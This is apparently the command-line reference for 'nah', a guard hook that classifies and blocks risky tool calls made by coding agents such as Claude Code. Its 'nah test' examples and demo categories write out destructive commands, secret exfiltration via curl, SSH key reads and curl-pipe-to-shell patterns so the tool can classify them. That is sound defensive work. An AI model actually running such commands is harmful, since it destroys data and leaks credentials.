# CLI Reference

All nah commands. Run `nah --version` to check your installed version.

## Core

### nah install

Install the nah hook into a coding agent's settings.

```bash
nah install                # install for Claude Code (default)
nah install --agent claude # explicit agent selection
```

Creates the hook shim at `~/.claude/hooks/nah_guard.py` (read-only, chmod 444) and adds `PreToolUse` hook entries to the agent's `settings.json`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--agent AGENT` | Agent to target: `claude` (default) |

### nah update

Update the hook script after a pip upgrade.

```bash
nah update
```

Unlocks the hook script, overwrites it with the current version, and re-locks it (chmod 444). Also updates the interpreter path and command in agent settings.

**Flags:**

| Flag | Description |
|------|-------------|
| `--agent AGENT` | Agent to target: `claude` (default) |

### nah uninstall

Remove nah hooks from a coding agent.

```bash
nah uninstall
```

Removes nah entries from the agent's `settings.json`. Deletes the hook script if no other agents still use it.

**Flags:**

| Flag | Description |
|------|-------------|
| `--agent AGENT` | Agent to target: `claude` (default) |

### nah config show

Display the effective merged configuration.

```bash
nah config show
```

Shows all config fields with their resolved values after merging global and project configs.

### nah config path

Show config file locations.

```bash
nah config path
```

Prints the global config path (`~/.config/nah/config.yaml`) and project config path (`.nah.yaml` in the git root, if detected).

## Test & Inspect

### nah test

Dry-run classification for a command or tool input.

```bash
nah test "rm -rf /"
nah test "git push --force origin main"
nah test "curl -X POST https://api.example.com -d @.env"
nah test --tool Read ~/.ssh/id_rsa
nah test --tool Write --path ./config.py --content "api_key='sk-secret123'"
nah test --tool Grep --pattern "BEGIN.*PRIVATE"
```

Shows the full classification pipeline: stages, action types, policies, composition rules, and final decision. For `ask` decisions, also shows LLM eligibility and (if configured) makes a live LLM call.

**Flags:**

| Flag | Description |
|------|-------------|
| `--tool TOOL` | Tool name: `Bash` (default), `Read`, `Write`, `Edit`, `Grep`, `Glob`, `mcp__*` |
| `--path PATH` | Path for Read/Write/Edit/Glob tool input |
| `--content TEXT` | Content for Write/Edit content inspection |
| `--pattern TEXT` | Pattern for Grep credential search detection |
| `args` | Command string or tool input (positional, required for Bash) |

### nah types

List all 20 action types with their descriptions and default policies.

```bash
nah types
```

If you have global classify entries that shadow built-in rules or flag classifiers, annotations are shown with `nah forget` hints.

### nah log

Show recent hook decisions from the JSONL log.

```bash
nah log                          # last 50 decisions
nah log --blocks                 # only blocked decisions
nah log --asks                   # only ask decisions
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable JSONL output
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--blocks` | Show only blocked decisions |
| `--asks` | Show only ask decisions |
| `--tool TOOL` | Filter by tool name (Bash, Read, Write, ...) |
| `-n`, `--limit N` | Number of entries (default: 50) |
| `--json` | Output as JSON lines |

## Security Demo

### /nah-demo

Live security demo that runs inside Claude Code. Walks through real tool calls and shows nah intercepting them in real-time.

```
/nah-demo                        # 25 cases across 8 threat categories
/nah-demo --full                 # all 90 cases + config variants
/nah-demo --story rce            # deep-dive into a single category
```

**Stories:**

| Story | What it covers |
|-------|---------------|
| `safe` | Operations that should pass through |
| `rce` | Remote code execution (curl \| bash, wget \| sh) |
| `exfil` | Data exfiltration (piping secrets to network) |
| `obfuscated` | Obfuscated execution (base64, eval, nested shells) |
| `path` | Path & boundary protection (sensitive dirs, project scope) |
| `destructive` | Destructive operations (rm, force push, DROP TABLE) |
| `secrets` | Credential & secret detection in file content |
| `network` | Network context (trusted vs unknown hosts) |

## Manage Rules

Adjust policies from the command line -- no need to edit YAML.

### nah allow

Set an action type to `allow`.

```bash
nah allow filesystem_delete
nah allow lang_exec --project    # write to project config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config |

### nah deny

Set an action type to `block`.

```bash
nah deny network_outbound
nah deny git_history_rewrite --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config |

### nah classify

Classify a command prefix as an action type.

```bash
nah classify "docker rm" container_destructive
nah classify "psql -c DROP" db_write --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config |

### nah trust

Trust a filesystem path or network host. Polymorphic -- detects path vs. host automatically.

```bash
nah trust ~/builds              # trust a path (global only)
nah trust api.example.com       # trust a network host
```

Paths starting with `/`, `~`, or `.` are treated as filesystem paths and added to `trusted_paths`. Everything else is treated as a hostname and added to `known_registries`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project config (global only — flag is rejected for paths and ignored for hosts) |

### nah allow-path

Allow a sensitive path for the current project.

```bash
nah allow-path ~/.aws/config
```

Adds a scoped exemption: the path is only allowed from the current project root. Written to global config.

### nah status

Show all custom rules across global and project configs.

```bash
nah status
```

Lists action overrides, classify entries, trusted hosts/paths, allow-paths, and safety list modifications. Global classify entries that shadow built-in rules show annotations.

### nah forget

Remove a rule by its identifier.

```bash
nah forget filesystem_delete     # remove action override
nah forget "docker rm"           # remove classify entry
nah forget api.example.com       # remove trusted host
nah forget ~/builds              # remove trusted path
nah forget --project lang_exec   # search only project config
nah forget --global lang_exec    # search only global config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Search only project config |
| `--global` | Search only global config |
